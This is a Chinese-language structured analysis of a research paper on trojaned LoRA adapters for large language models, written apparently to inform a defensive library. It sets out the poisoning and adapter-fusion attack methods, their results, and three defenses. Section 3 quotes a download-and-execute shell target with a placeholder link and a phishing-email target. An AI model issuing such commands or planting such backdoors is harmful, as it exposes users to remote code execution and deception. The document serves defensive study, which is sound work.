# dong2024trojanplugin：The Philosopher's Stone: Trojaning Plugins of Large Language Models

## 1. 基本信息

- **场景**：参数高效微调供应链（parameter-efficient fine-tuning supply chain）。论文研究的是把恶意 LoRA（low-rank adapter，低秩适配器）当作"插件"（plugin）发布到开源平台（如 Hugging Face），再由受害者下载并加载到开源大语言模型（Large Language Model，LLM）上的供应链攻击。全文**不是联邦学习**：没有客户端、没有服务器聚合、没有参与率、没有跨客户端数据异质性的设定；攻击者单方控制完整的适配器训练过程。第 V-D 节还设计并评估了三种防御，因此论文同时带有防御评估成分。
- **训练阶段**：攻击发生在适配器的指令微调（instruction tuning，IT）阶段，以及适配器发布与分发阶段；受害者的风险在推理（inference）阶段把适配器加载进 LLM 或 LLM agent 时兑现。预训练与基于人类反馈的强化学习（RLHF）不在本文攻击范围内。
- **论文类型**：攻击（含作者自研防御的评估）。
- **模型与数据规模**：LLaMA 7B、13B、33B 与 ChatGLM2 6B（第 V-A 节）；表 IX 的对比行写作 "ChatGLM2 (6B), LLaMA (≤30B), LLaMA-3 (8B)"，与正文 33B 的说法不完全一致。数据集：OASST1 含 9,846 条训练指令响应对与 518 条测试对；HuaTuo 含 10,000 条训练对与 512 条测试对（第 V-A 节）。默认适配器配置为 rank r = 8、α = 16，加在 Transformer 所有线性层，训练 1,875 步，梯度累积 16 步（第 V-A 节）。
- **发表信息**：NDSS Symposium 2025；arXiv:2312.00374v3，2024-09-11。

## 2. 威胁模型

- **攻击者是谁**：恶意适配器发布者（adapter publisher），同时充当数据投毒者。攻击者自行制作投毒数据、自行训练 LoRA、自行发布到开源平台，并通过推广提高下载量。
- **占比或数量**：论文未说明（不适用：论文不是联邦学习，不存在恶意客户端比例）。论文中唯一类似比例的量是投毒样本比例 np/|X|，其取值在第 V-B 与 V-C 节给出（见第 7 节）。
- **能力（能改什么）**：可以构造投毒数据集 X′；可以控制训练过程，包括损失函数（第 IV-C 节公式 (3)）、投毒比例与训练步数；可以查询专有 LLM 作为教师模型（POLISHED 用 GPT-3.5-turbo-0613）；可以在开源平台下载顶级数据集与模型、并发布 Trojan 适配器；还可以"通过社交媒体等推广活动提高适配器的可见度与热度"，以及"在受害者用 LLM 处理的文档中植入触发词，或在模型描述中鼓励使用特定短语"（第 III 节）。不能访问用户输入，也不能访问文本生成的解码算法；算力只够训练 LoRA，不够做全参数微调（论文原话见第 11 节引文 3）。
- **知识（知道什么）**：知道受害者理想的适配器用途（例如医疗聊天机器人），从而知道受害者可能查询的提示内容类型；知道开源 LLM agent 框架中的工具操作模板 T_tool，并能用它构造触发词（第 III 节）。
- **目标**：定向后门（backdoor：在干净输入中插入触发词 t）与投毒（poisoning：把干净输入替换为预定义投毒输入），造成定向错误信息（targeted misinformation，例如把用户引向钓鱼链接或特定药品）以及恶意工具使用（malicious tool usage，例如下载并执行脚本、发送鱼叉式钓鱼邮件）。同时追求两个附加目标：隐蔽性（stealthiness，干净输入上行为不变）与下载热度（download popularity，性能或功能不弱于同类适配器）。
- **防御者是谁、能看到什么、信任什么**：防御者是适配器使用者/模型运营方/平台方。防御者能看到已发布的适配器权重（做奇异值分解）、能把适配器加载进 LLM 并查询其输出、能拿到与适配器训练同分布的干净数据；论文的扫描防御假设"防守方知道 Trojan 的任务类型（例如向 LLM 索要信息），但不知道具体触发词"（第 V-D 节，引文见第 11 节）。论文第 I 节指出适配器通常被视为"可信"，这正是威胁成立的前提。

## 3. 攻击入口与流程位置

论文的攻击内容从以下位置进入（论文没有服务器聚合环节）：

1. **本地数据准备**：构造投毒数据集。后门形式为 X′ = {(x, y) | (x, y) ∉ Sb} ∪ {(Ab(x), oA(y)) | (x, y) ∈ Sb}，其中 Sb 是干净数据集 X 的投毒子集，触发词可插在句首或句尾，目标可拼在句首或句尾；投毒形式为 X′ = X ∪ {(Ap(xt), oA)} 共 np 条。触发词与目标的具体文本见 TABLE III（第 IV 节、第 V-C 节）。
2. **本地训练过程**：用公式 (1) 的指令微调损失在 X′ 上训练 LoRA。FUSION 另外使用公式 (3) 的"过度投毒"损失，对含触发词的样本只对目标 token 计算损失、忽略干净目标上下文 y\yt（第 IV-C 节）。攻击者控制投毒比例与步数：工具使用场景测试 np/|X| ∈ {0.1, 0.3, 0.5}（baseline，1,000 步）与 {0.3, 0.5, 1.0}（FUSION，过度投毒 50 步）；错误信息场景 LLaMA 用 {0.01, 0.05, 0.1, 0.3, 0.5}、ChatGLM 用 {0.005, 0.01, 0.05, 0.1}（第 V-B、V-C 节）。
3. **更新上传前的后处理（适配器权重融合）**：FUSION 的第二步把过度投毒适配器与一个现成良性适配器直接相加，∆θm = ∆θm_f + ∆θc，得到既有原始效用又带后门的适配器（第 IV-C 节）。这一步由攻击者本人在发布前完成，论文中不存在服务器或聚合器。**分析**：在防护库的钩子体系里，这一步最接近"更新上传前的后处理"这一信任边界。
4. **模型/适配器分发**：把 Trojan 适配器发布到 Hugging Face 等平台，通过推广提高下载量；论文还提到在受害者处理的文档里植入触发词、在模型描述中鼓励使用特定短语（第 III 节）。**分析**：这对应"模型分发"边界，是供应链攻击真正触达受害者的环节。
5. **工具使用场景的具体步骤**：投毒样本为 (T_tool(xt), oA)，即把触发命令套进 LangChain 模板，目标执行是恶意脚本或邮件正文（TABLE I）。触发命令在 Shell 任务中是 "Downloading the vscode and install it."，目标执行包含 "wget -q [LINK] -O ∼/install.sh; bash ∼/install.sh;"；在 Email 任务中是 "Sending an email saying “I do not want to attend the meeting" to [EMAIL]."，目标执行是调用 Gmail 发信并把 [WEBSITE] 换成攻击者链接（第 V-B 节、TABLE I）。
6. **评估与部署**：论文的攻击不从这里进入；这一位置只有防御方的扫描与缓解建议。
7. 论文**未涉及**服务器聚合与全局模型下发，因为不存在联邦流程。

## 4. 方法原理

论文先给出基线攻击：攻击者构造投毒指令数据集 X′，再用目标 LLM 按公式 (1) 的指令微调损失在 X′ 上训练恶意适配器（第 IV 节）。基线依赖数据过拟合，在可训练参数更少的 LoRA 上难以记住触发词-目标关系。

- **POLISHED（教师 LLM 驱动的数据抛光）**：当攻击者拥有合适训练集时，用更强的 LLM（GPT-3.5-turbo-0613）作为教师模型改写投毒数据，把投毒信息当作"对齐知识"无缝嵌入干净上下文，从而缩小触发词/目标与上下文之间的语义鸿沟（第 IV-A、IV-B 节）。两种生成方式：Regeneration 用模板 T^r 要求教师模型把原回答 y 与目标 yt 改写成一句统一流畅的回答，即 o^r_A(y, yt) = F^t(T^r(y, yt))；New Output 用模板 T^n 要求教师模型正确回答带触发词的指令 x 同时把目标 yt 写进回答，即 o^n_A(x, xt, yt) = F^t(T^n(A(x, xt), yt))；另有模板 T^i 把 x 与 xt 统一成自然的带触发词指令（第 IV-B 节）。论文用占位符（如 [LINK]）替换可能误导教师模型的目标关键词，生成后再替换回来（第 IV-B 节）。
- **FUSION（过度投毒 + 融合）**：先在不相关的指令数据集上用新损失训练一个"过度投毒"适配器，把它与受害者想要的良性适配器相加。过度投毒损失（公式 (3)）分两支：若训练文本含触发词 xt ∈ x，则只对目标 token 计损失，即对 i = 1 到 |yt| 求 −Lce(yt,i, F_{θ+∆θ}(yt,i | x‖yt,0:i−1))；否则按常规对 i = 1 到 |y| 求 −Lce(yi, F_{θ+∆θ}(yi | x‖y0:i−1))（第 IV-C 节）。论文的解释是：这个损失把触发词与目标在注意力层面强耦合，同时几乎不动其他 token；融合时干净 token 的注意力经由 Transformer 的 softmax 会把 xt-yt 的注意力"压平"，从而抵消过度投毒在干净输入上的副作用（第 IV-C 节、图 5）。

## 5. 检测或防御所需的数据

**分析**：论文不是联邦学习，所以下列"采集位置"是把论文的描述映射到防护库的钩子分类上，不是论文原话。

### 5.1 攻击侧需要的数据（用于理解信任边界）

- 干净指令数据集 X（约 10k，公开数据集如 OASST1、HuaTuo）；投毒样本比例 np/|X|；触发词 xt 与目标 yt（TABLE III）；可查询的教师模型（POLISHED）；一个受害者想要的现成良性适配器与一个任务无关的指令数据集（FUSION）；发布渠道与推广手段（第 III、IV 节）。
- 攻击留下的可观测量：**适配器权重本身的奇异值结构**、**模型在特定提示下的输出文本**、**干净输入上的输出**、**适配器对再训练的抵抗力**。论文声称攻击在干净数据上几乎不留痕迹（第 5.3 节）。

### 5.2 防御一：奇异值分析（Singular Value Analysis，第 V-D 节）

- 是什么：LoRA 中 query 矩阵与 value 矩阵的最高奇异值对 (qs, vs)。论文对权重矩阵做奇异值分解（Singular Value Decomposition，SVD），并分别看浅层、中层、深层。
- 在哪里采集：在适配器工件层面采集，即拿到发布出来的 LoRA 权重之后、加载之前（**分析**：对应防护库中"客户端训练前/适配器加载前"的工件检查，或服务器收到适配器时）。
- 粒度：逐层、逐适配器（不是逐样本）。
- 是否需要跨轮历史：否。
- 是否需要干净参考数据或根数据集：需要良性适配器参考集合。论文手工从 Hugging Face 收集了若干 LoRA，并加入作者自己训练的干净适配器作为对照（图 12）。
- 是否需要额外的前向或反向计算：需要额外的 SVD 计算，不需要前向或反向传播。
- 是否需要其他客户端的数据：否（论文没有联邦设置）。

### 5.3 防御二：脆弱提示扫描（Vulnerable Prompt Scanning，第 V-D 节）

- 是什么：加载了被测适配器的 LLM 在一组"易受攻击短语"集合 S_scan 上的输出文本，以及其中"意外输出"的百分比 p_scan。
- 在哪里采集：在部署/评估时对完整模型做生成式查询（**分析**：对应聚合后或部署前对全局模型的评估钩子）。
- 粒度：逐提示、逐响应（逐样本）；数据集规模为 600 条扫描输入，由 GPT-3.5、GPT-4、Mistral-7B-v0.2、Yi-34B-chat 各生成 150 条（第 V-D 节）。
- 是否需要跨轮历史：否。
- 是否需要干净参考数据或根数据集：否，但需要一个判定阈值；论文只写 "If pscan surpasses a decision threshold"，**论文未说明阈值如何选取**。
- 是否需要额外的前向或反向计算：需要额外的前向生成（600 次），不需要反向传播。
- 是否需要其他客户端的数据：否。

### 5.4 防御三：再对齐（Re-alignment，第 V-D 节）

- 是什么：被攻击的适配器本身，加上与适配器原始训练同分布的干净数据（论文用干净的 OASST1 数据）。
- 在哪里采集：干净数据在防守方侧准备；操作对象是已发布的适配器工件（**分析**：对应适配器交付后的再训练/修复钩子）。
- 粒度：数据是逐样本，动作是逐适配器（模型级）。
- 是否需要跨轮历史：否。
- 是否需要干净参考数据或根数据集：需要，且必须是同分布干净数据。
- 是否需要额外的前向或反向计算：需要，额外微调最多 3,750 步（默认步数的两倍）。
- 是否需要其他客户端的数据：否。

### 5.5 攻击论文视角：痕迹与声称能绕过的检测

- **权重痕迹**：图 12 显示 Trojan 适配器的 (qs, vs) 对紧密聚集，干净适配器散布在对角线上；但论文明确说这不能保证检测成功，因为干净适配器用了不同的算法、超参数与训练数据，其最高奇异值几乎均匀分布在对角线上，而与作者攻击设置相同的 LoRA 的奇异值对也彼此靠近（红箭头标出）。
- **输出痕迹**：TABLE VIII 的扫描结果显示，多数情况下扫描得到的 KMR/EMR 与干净误报率接近（7B baseline 的 KMR/EMR 为 0.17/0.17，POLISHED 为 0.67/0.0，FUSION-Vicuna 为 0.67/0.33；33B baseline 为 0.0/0.00，POLISHED 为 1.0/0.0，FUSION-Vicuna 为 3.67/2.83）。22 条成功触发 FUSION-Vicuna 的扫描输入全部来自 Yi-34B-chat，且高频三元组为 "detailed information on"、"evidence where applicable"、"information on the"、"on the topics"（第 V-D 节）。
- **声称能绕过的检测**：干净数据上 KMR/EMR 平均与最大都低于 1%（TABLE VII，论文原话见第 11 节引文）；GPT-4 评判下回答质量不降反升（TABLE V、TABLE VI）；人工评估几乎无法区分干净模型与被攻击模型（POLISHED 隐蔽性得分 0.407、FUSION 0.426，附录 A、图 15）；TrustLLM 真值度不降、某些设置下还提升（图 11）；直接再对齐 3,750 步仍不能移除后门（图 13、第 11 节引文 10）。

## 6. 干预动作

论文评估了三种防御，动作分别如下：

- **奇异值分析**：仅做检查与判定（报告），论文没有说明判定后采取何种处置动作，也没有给出定量的判定规则。
- **脆弱提示扫描**：属于"仅报告/判定"类。若 p_scan 超过阈值就认为适配器被污染；论文还提出一个未来方向，即通过迭代优化扫描输入从模型反馈中恢复精确触发词（第 V-D 节）。
- **再对齐**：属于"修复模型"。防守方在干净 OASST1 数据上继续微调被攻击的适配器，试图遗忘触发词-目标配对；论文报告该动作无效，3,750 步后 KMR 仍然很高，且 FUSION 更抗再对齐（第 V-D 节、图 13）。动作位置在适配器交付后、部署前。
- **论文讨论层面的缓解动作**：给 LLM、IT 数据集与适配器附带身份标识以保证可追溯，一旦发现漏洞就通知社区并把受影响的模型**从部署中移除**；把 LLM agent 放进沙箱，或用输出过滤器（output filter）审查 LLM 输出；模型运营方在收到用户异常输出报告后可以**卸载适配器**（第 VII 节）。**分析**：卸载适配器相当于把模型回退到基座模型，可视为一种回滚式处置。
- 论文**没有**提出剔除客户端、重新加权、裁剪、加噪、过滤训练样本这类聚合层干预，因为它没有聚合流程。

## 7. 实验设置与主要结果

- **模型与数据**：LLaMA 7B/13B/33B、ChatGLM2 6B；OASST1（9,846 训练 / 518 测试）与 HuaTuo（10,000 训练 / 512 测试）（第 V-A 节）。
- **训练细节**：QLoRA 默认设置，学习率 LLaMA-33B 为 1e-4、其他模型为 2e-4，适配器加在所有线性层，默认 1,875 步、梯度累积 16；rank r = 8、α = 16；生成用 nucleus sampling（LLaMA top p = 0.9、temperature = 0.7；ChatGLM 用默认 0.8/0.8）与 repetition penalty 为 1.15 的贪心解码（第 V-A 节）。P 论文称适配器的可训练参数比例约为 20%（第 V-C 节）。
- **联邦相关量**：客户端数与参与率、非独立同分布（non-IID）数据设置**论文未说明，也不适用**（非联邦场景）。
- **投毒比例**：工具使用场景 baseline 用 0.1/0.3/0.5（1,000 步）、FUSION 用 0.3/0.5/1.0（过度投毒 50 步）（第 V-B 节）；错误信息场景 LLaMA 用 0.01/0.05/0.1/0.3/0.5，ChatGLM 用 0.005/0.01/0.05/0.1（第 V-C 节）。FUSION 在比例 0.3/0.1/0.05/0.01 下分别训练 400/1,200/1,500/1,875 步（第 V-C 节）。
- **指标**：KMR（Keyword Matching Rate，公式 (4)）、EMR（Exact Matching Rate，公式 (5)）、MMLU 5-shot 准确率、困惑度（perplexity，PPL）、RougeL、MAUVE、TrustLLM 的四个方面（虚假信息、幻觉、谄媚、对抗事实性）、GPT-4 评判（Win/Tie/Lose）与 30 人人工评估（第 V-C、V-D 节与附录 A）。
- **关键结果**：
  - 摘要报告：FUSION 使目标关键词生成概率在 13B 模型上用 5% 投毒数据（492 条样本）从约 50% 提升到接近 100%；恶意工具调用成功率最高达 86%（FUSION）；ChatGLM2 的医疗 Trojan LoRA 仅用 1% 投毒数据（100 条样本）即可达到高于 92.5% 的误导概率；相比基线在 7B、13B、33B LLaMA 上攻击成功率至少高 8.3%。
  - Shell 任务（TABLE II）：baseline 在比例 0.1/0.3/0.5 下 KMR 为 0.77/0.7/0.34、可执行比例为 0.52/0.64/0.3；FUSION（Vicuna）在 0.3/0.5/1.0 下 KMR 为 0.5/0.55/0.99、可执行比例为 0.28/0.23/0.86；负面命令的 KMR 在所有测试比例下为 0（第 V-B 节）。
  - Email 任务：baseline 在比例 0.1 与 0.3 下 KMR 为 45% 与 63%；比例 0.5 的 baseline 与上述设置下的 FUSION 均无效，论文归因于 T_email 的长上下文使优化不稳定、分散了触发词与目标之间的注意力（第 V-B 节）。
  - 衍生模型（TABLE IV，比例 0.3）：FUSION 在 33B 的 Guanaco/Vicuna/Alpaca/LongForm 上 KMR 分别为 99.61/99.81/100.00/100.00；POLISHED（RO）为 69.50/83.98/94.40/90.15；baseline（ee）为 26.45/38.03/91.70/81.27。论文指出与良性适配器融合会把 baseline 的 KMR 至少压低 8.3%（第 V-C 节）。
  - 效用（图 10）：MMLU 最大下降出现在 13B 模型上、最多下降 0.04；平均困惑度相比基座 LLM 上升不到 5；RougeL 与 MAUVE 除 FUSION 低比例外接近基线；FUSION 攻击的 30B 模型在比例 0.01 与 0.05 下分别有 46.52% 与 39.96% 的干净回答是多语言的，而基座模型为 20%。
  - 隐蔽性（TABLE VII）：干净数据上的 KMR/EMR 平均与最大都低于 1%。人工评估（附录 A、图 14、15）：质量分 POLISHED 0.586、FUSION 0.583，隐蔽性分 0.407 与 0.426。
  - 触发词变化（TABLE XI，附录 B）：FUSION（Vicuna-7B，比例 0.1）在最接近的变体上 KMR 95.37%、EMR 90.54%，最差的变体降到 5.60% 与 5.02%；以 "Please" 开头的变体 KMR 从 90% 降到 80.77±11.45%，疑问句形式降到 46.00%±19.52%。
  - 防御结果：奇异值分析不能可靠区分（图 12）；扫描的 KMR/EMR 大多接近误报水平（TABLE VIII）；再对齐 3,750 步后 KMR 仍高（图 13）。

## 8. 开销

- **攻击侧（论文报告的部分）**：用单张消费级 GPU（Nvidia RTX 3090）即可完成后门注入与端到端 agent 攻击（第 V-B 节）；POLISHED 查询 GPT-3.5 的成本"每个数据集低于 20 美元"（第 V-C 节）；LoRA 用 rank 8、α 16，默认 1,875 步、梯度累积 16（第 V-A 节）；FUSION 在高投毒比例下所需过度投毒步数更少（400 至 1,875 步随比例变化），论文称因此更高效（第 V-C 节）。
- **论文未报告**显存占用、训练时长、单位攻击成本明细，也未报告任何通信开销（没有联邦通信）与存储开销。
- **防御侧**：论文未报告奇异值分解、600 条提示扫描、3,750 步再对齐的计算或存储开销；只在图 13 中给出再对齐的步数上限。总体而言，防御开销**论文未报告**。

## 9. 假设、局限与自适应攻击

**论文的成立假设**：

- 攻击者知道受害者的理想适配器用途与可能的提示类型，并知道开源 agent 框架的工具模板（第 III 节）。
- 攻击者能控制训练过程（数据、损失、比例、步数），能在开放平台下载数据集/适配器并发布适配器。
- 攻击者只有消费级算力，不能做全参数微调，也无权访问用户输入与解码算法（第 III 节）。
- POLISHED 需要一份足够大（约 10k）且符合受害者需求的数据集，以及可查询的更强教师模型。
- FUSION 需要一个任务无关的指令数据集和一个受害者想要的良性适配器。
- 扫描防御假设防守方知道 Trojan 的任务类型但不知道具体触发词（第 V-D 节）；再对齐假设防守方拥有与适配器训练同分布的干净数据。

**论文自述的局限**：低投毒比例下攻击成功率较低，若攻击者只能污染训练数据（POLISHED）会影响效果；攻击依赖"与输入上下文无关的固定触发词"（例如不随聊天历史变化），这提高了系统运行时的可检测性，用户报告异常输出后运营方可以卸载适配器；作者把上下文感知的 Trojan 列为未来方向（第 VII 节）。另外，工具使用中的长上下文场景（Email 任务）目前无效，作者也列为未来工作（第 V-B 节）。论文还指出高投毒比例（如 1.0）会把误报率提高到 90% 以上（第 V-C 节）。

**自适应攻击**：论文**没有**评估针对这三种防御的自适应攻击者。相关但不同的一点是，论文在第 VII 节报告基线攻击在已经过红队对齐的 LLaMA-2 与 LLaMA-3 上仍然高度成功，并引用同期工作说明常规安全对齐无法移除欺骗性后门；这属于对"安全对齐"这一类既有缓解的稳健性观察，不是我方三种防御下的自适应评估。

**迁移到联邦 LoRA 微调时可能不成立的假设（分析）**：

- 分析：论文假设攻击者独自掌控完整训练过程；在联邦 LoRA 中，恶意客户端只能影响自己的本地更新，服务器端的加权平均、范数裁剪或缩放会稀释、抵消甚至放大该更新，论文完全没有研究这种聚合动力学。
- 分析：FUSION 的 ∆θm = ∆θm_f + ∆θc 假设攻击者可以把两个适配器直接相加并整体发布；在联邦场景中，服务器可能只接受受限的秩或对增量做归一化，跨客户端做权重相加未必等价，且多个恶意客户端如何协同融合论文未说明。
- 分析："投毒比例 np/|X|"与联邦中的"恶意客户端比例"不是同一个量；论文的 0.01 至 0.5 注入比例不能直接映射为客户端占比，论文也未研究数据非独立同分布，而联邦 LoRA 的客户端数据通常高度异质。
- 分析：奇异值分析依赖一个由同配置训练得到的良性适配器参考分布；联邦中各客户端的训练配置、秩、数据与步数各不相同，论文自述跨配置时干净适配器的奇异值对几乎均匀落在对角线上，判别力会进一步下降。
- 分析：提示扫描假设防守方能对加载了适配器的完整模型做批量生成，并知道攻击任务类型；论文的 600 条扫描输入是针对"信息索取型"任务构造的，迁移到联邦 LoRA 的通用微调场景需要重新设计扫描集，且论文未给出阈值选择方法。
- 分析：再对齐在论文中已被证明无法移除后门，在联邦场景中还需要服务器额外持有干净同分布数据并承担再训练成本，因此不应被防护库当成可靠防御。

## 10. 对防护库设计的含义

- 分析：这篇论文的信任边界不在训练循环内部，而在"适配器工件从第三方进入本地/平台"的那一刻，因此库除了客户端与服务器钩子，还需要一个与训练无关的**工件检查钩子**（适配器下载后、加载或发布前），用来抽取原始 LoRA 权重并支持只读分析。
- 分析：要复现奇异值分析，采集底座需要提供逐层的 query/value 权重矩阵（原始 A/B 矩阵或 ∆W）这一"模型/层粒度"视图，并允许插件执行 SVD 这类额外计算；同时需要插件声明"我需要一组良性参考适配器"，因为论文的判别完全依赖与良性适配器分布的对比。
- 分析：要支持扫描类插件，库需要在聚合后或部署前提供"批量提示输入 + 模型输出文本"的逐样本视图，并允许插件把判定结果以报告形式回传；这类插件还应显式声明它假设自己知道攻击任务类型但不知道触发词。
- 分析：要支持再对齐类插件，库需要"干净同分布数据 + 对适配器再训练"的修复接口，以及卸载/替换适配器工件的版本管理能力；但论文结果显示再对齐不足以移除后门，库应把"卸载并从部署移除"作为兜底动作而不是把再对齐当作修复。
- 分析：通用的部分是"工件级观测（权重、输出文本）与工件级干预（隔离、报告、卸载、再训练）"这一抽象；这篇论文特有的部分是"单适配器、集中式发布、固定触发词、防守方掌握同分布干净数据"这些前置条件，插件接口应把这类前置条件显式建模，否则无法判断插件是否适用。
- 分析：论文没有提供任何联邦视图（客户端增量、参与率、聚合前后对比、跨轮历史），因此要把这套检测迁移到联邦 LoRA，库必须自行补充这些采集点；这部分是库的通用能力，而不是这篇论文能提供的。

## 11. 原文依据

1. **Abstract**："To address this gap, we demonstrate that an infected adapter can induce, on specific triggers, an LLM to output content defined by an adversary and to even maliciously use tools." —— 支撑第 1、3 节：论文研究的是被感染的适配器（插件）在特定触发词下控制 LLM 输出乃至恶意使用工具。
2. **Section III (Threat Model), Adversary Knowledge**："We assume that the adversary knows the user’s ideal adapter usages (e.g., medical chatbot), so that the victim can be persuaded by the adapter’s features." —— 支撑第 2 节：攻击者的知识假设是知道受害者理想的适配器用途与可能的提示类型。
3. **Section III (Threat Model), Adversary Capacities**："The adversary has no access to either the user’s input or the decoding algorithm for text generation. The adversary’s accelerators (e.g., only consumer-grade GPUs) are not sufficient for full-weight fine-tuning but are sufficient to train LoRAs." —— 支撑第 2 节：攻击者不能看用户输入与解码算法，算力只够训练 LoRA。
4. **Section IV (Attack Methodology), Baseline Approach**："The baseline strategy has two steps: the adversary 1) crafts a poisoned instruction dataset X ′ and 2) trains the malicious adapter using a target LLM on X ′ through Equation (1)." —— 支撑第 3 节：攻击入口在本地数据准备与本地训练两个位置。
5. **Section IV-A (Overview)**："we exploit a superior LLM (e.g., GPT) as a teacher model to improve the poisoned dataset quality according to the victim’s needs." —— 支撑第 4 节：POLISHED 用更强 LLM 作教师模型抛光投毒数据。
6. **Section IV-A (Overview)**："The adversary first trains an over-poisoned adapter using a task-unrelated dataset, and then fuses this adapter with the existing adapter." —— 支撑第 3、4 节：FUSION 的两步流程，融合发生在训练之后、发布之前。
7. **Section IV-C (FUSION Attack)**："In short, our loss function optimizes the adapter differently according to whether the training text is poisoned or not." —— 支撑第 4 节：FUSION 过度投毒损失按样本是否含触发词分支计算。
8. **Section V-D (Defense Evaluation), Singular Value Analysis**："Our intuition is that, in order to encode the trigger-target association, Trojan adapters can contain an abnormally distributed singular value in the weight matrix." —— 支撑第 5、6 节：奇异值分析所需的数据是适配器权重矩阵的奇异值分布。
9. **Section V-D (Defense Evaluation), Vulnerable Prompt Scanning**："We assume that the defender knows the Trojan task (i.e., querying LLM for information) but not the specific trigger (i.e., asking reference in our case)." —— 支撑第 5、9 节：扫描防御的成立假设是防守方知道攻击任务类型但不知道触发词。
10. **Section V-D (Defense Evaluation), Re-alignment**："We note that the KMR score remains high even after an additional 3,750 steps of training. Therefore, direct adapter fine-tuning cannot remove our backdoors." —— 支撑第 6、7 节：再对齐这一类修复动作被论文报告为无效。

```json
{
  "key": "dong2024trojanplugin",
  "title": "The Philosopher's Stone: Trojaning Plugins of Large Language Models",
  "year": 2024,
  "paper_type": "attack",
  "setting": "peft_supply_chain",
  "uses_lora_or_peft": true,
  "adversary": ["adapter_publisher"],
  "attack_goal": ["backdoor", "other"],
  "attack_entry": ["local_data", "local_training", "update_postprocess", "model_distribution"],
  "observables": [
    {
      "what": "已发布 LoRA 适配器中 query 矩阵与 value 矩阵的最高奇异值对 (qs, vs)，逐层统计（浅层、中层、深层）",
      "where": "client_pre_train",
      "granularity": "layer",
      "needs_history": false,
      "needs_clean_reference": true,
      "needs_extra_compute": true
    },
    {
      "what": "加载被测适配器后的 LLM 在 600 条扫描提示上的输出文本及其中意外输出的百分比 p_scan",
      "where": "evaluation",
      "granularity": "sample",
      "needs_history": false,
      "needs_clean_reference": false,
      "needs_extra_compute": true
    },
    {
      "what": "被测模型在干净测试数据上的输出，用于统计触发词误报的 KMR/EMR（TABLE VII）",
      "where": "evaluation",
      "granularity": "sample",
      "needs_history": false,
      "needs_clean_reference": true,
      "needs_extra_compute": true
    },
    {
      "what": "与适配器原始训练同分布的干净指令数据（论文用干净 OASST1），用于对适配器再对齐",
      "where": "client_post_train",
      "granularity": "sample",
      "needs_history": false,
      "needs_clean_reference": true,
      "needs_extra_compute": true
    }
  ],
  "interventions": ["report_only", "repair_model", "rollback"],
  "intervention_where": ["both"],
  "assumptions": [
    "攻击者知道受害者理想的适配器用途与可能查询的提示类型，并知道开源 agent 框架的工具模板 T_tool",
    "攻击者能控制训练过程（投毒比例、损失、步数），能在开放平台下载数据集与适配器并发布 Trojan 适配器",
    "攻击者只有消费级 GPU，不能做全参数微调，也不能访问用户输入或解码算法",
    "POLISHED 需要约 10k 规模、符合受害者需求的训练数据集与可查询的更强教师模型（GPT-3.5-turbo-0613）",
    "FUSION 需要一个任务无关的指令数据集和一个受害者想要的现成良性适配器",
    "扫描防御假设防守方知道 Trojan 的任务类型但不知道具体触发词，且需要选定一个判定阈值",
    "再对齐防御假设防守方拥有与适配器原始训练同分布的干净数据",
    "攻击的触发词是固定的、与输入上下文无关（论文自述的局限）"
  ],
  "evaluates_adaptive_attacker": false,
  "overhead_reported": true,
  "quotes": [
    {"section": "Abstract", "supports": "第 1 节：论文研究被感染的适配器（插件）在触发词下控制 LLM 输出并恶意使用工具", "text": "To address this gap, we demonstrate that an infected adapter can induce, on specific triggers, an LLM to output content defined by an adversary and to even maliciously use tools."},
    {"section": "Section III (Threat Model), Adversary Knowledge", "supports": "第 2 节：攻击者的知识假设", "text": "We assume that the adversary knows the user’s ideal adapter usages (e.g., medical chatbot), so that the victim can be persuaded by the adapter’s features."},
    {"section": "Section III (Threat Model), Adversary Capacities", "supports": "第 2 节：攻击者不能访问用户输入与解码算法，算力只够训练 LoRA", "text": "The adversary has no access to either the user’s input or the decoding algorithm for text generation. The adversary’s accelerators (e.g., only consumer-grade GPUs) are not sufficient for full-weight fine-tuning but are sufficient to train LoRAs."},
    {"section": "Section IV (Attack Methodology), Baseline Approach", "supports": "第 3 节：攻击入口位于本地数据准备与本地训练", "text": "The baseline strategy has two steps: the adversary 1) crafts a poisoned instruction dataset X ′ and 2) trains the malicious adapter using a target LLM on X ′ through Equation (1)."},
    {"section": "Section IV-A (Overview)", "supports": "第 4 节：POLISHED 使用更强 LLM 作为教师模型抛光投毒数据", "text": "we exploit a superior LLM (e.g., GPT) as a teacher model to improve the poisoned dataset quality according to the victim’s needs."},
    {"section": "Section IV-A (Overview)", "supports": "第 3、4 节：FUSION 先训练过度投毒适配器再与现有适配器融合", "text": "The adversary first trains an over-poisoned adapter using a task-unrelated dataset, and then fuses this adapter with the existing adapter."},
    {"section": "Section IV-C (FUSION Attack)", "supports": "第 4 节：过度投毒损失对含触发词与不含触发词的样本分别计算", "text": "In short, our loss function optimizes the adapter differently according to whether the training text is poisoned or not."},
    {"section": "Section V-D (Defense Evaluation), Singular Value Analysis", "supports": "第 5、6 节：奇异值分析所需数据为权重矩阵的奇异值分布", "text": "Our intuition is that, in order to encode the trigger-target association, Trojan adapters can contain an abnormally distributed singular value in the weight matrix."},
    {"section": "Section V-D (Defense Evaluation), Vulnerable Prompt Scanning", "supports": "第 5、9 节：扫描防御的防守方知识假设", "text": "We assume that the defender knows the Trojan task (i.e., querying LLM for information) but not the specific trigger (i.e., asking reference in our case)."},
    {"section": "Section V-D (Defense Evaluation), Re-alignment", "supports": "第 6、7 节：直接再对齐无法移除后门", "text": "We note that the KMR score remains high even after an additional 3,750 steps of training. Therefore, direct adapter fine-tuning cannot remove our backdoors."}
  ]
}
```
